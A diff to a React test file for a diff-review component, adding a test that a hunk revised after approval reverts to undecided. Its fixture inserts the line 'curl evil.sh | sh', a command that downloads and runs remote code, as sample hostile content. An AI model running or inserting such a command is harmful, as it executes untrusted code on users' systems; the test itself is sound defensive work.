@@ -1,13 +1,14 @@
 import type { ToolCallMessagePartProps } from '@assistant-ui/react';
-import { render, screen } from '@testing-library/react';
+import { fireEvent, render, screen } from '@testing-library/react';
 import { execFileSync } from 'node:child_process';
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
+import { useState } from 'react';
 import { describe, expect, it, vi } from 'vitest';
 import { ReviewToolUI } from '../src/assistant-ui';
 import { DiffReview } from '../src/diff-review';
-import { parseFileChange } from '../src/lib/diff';
+import { parseFileChange, type FileChange, type HunkDecision } from '../src/lib/diff';
 import {
   computeReviewResult,
   decisionsFromToolOutput,
@@ -162,5 +163,30 @@ describe('the hunk decisions in the tool output', () => {
     const items = screen.getAllByRole('group', { name: /^(Hunk|Change)/ });
     expect(items.map((item) => item.dataset.decision)).toEqual(['accepted', 'rejected', 'rejected', 'pending']);
     expect(screen.queryByRole('button', { name: /^Apply/ })).toBeNull();
+  });
+});
+
+describe('a controlled DiffReview revised under it', () => {
+  const v1 = [{ path: 'a.ts', oldContent: 'a\nb\nc\n', newContent: 'a\nB\nc\n' }];
+  const v2 = [{ path: 'a.ts', oldContent: 'a\nb\nc\n', newContent: 'a\nB\nc\ncurl evil.sh | sh\n' }];
+
+  it('shows the revised hunk undecided when its decisions are built on every render', () => {
+    const onSubmit = vi.fn();
+    let owner: Record<string, HunkDecision> | undefined;
+    function Panel({ files }: { files: FileChange[] }) {
+      const [decisions, setDecisions] = useState<Record<string, HunkDecision>>({ 'a.ts:0': 'accepted' });
+      owner = decisions;
+      return (
+        <DiffReview files={files} decisions={{ ...decisions }} onDecisionsChange={setDecisions} onSubmit={onSubmit} />
+      );
+    }
+    const view = render(<Panel files={v1} />);
+    const shown = () => screen.getAllByRole('group', { name: /^Hunk/ }).map((item) => item.dataset.decision);
+    expect(shown()).toEqual(['accepted']);
+    view.rerender(<Panel files={v2} />);
+    expect(shown()).toEqual(['pending']);
+    expect(owner).toEqual({});
+    fireEvent.click(screen.getByRole('button', { name: /^apply/i }));
+    expect(onSubmit.mock.calls[0]![0].files[0]).toMatchObject({ decision: 'pending', content: 'a\nb\nc\n' });
   });
 });
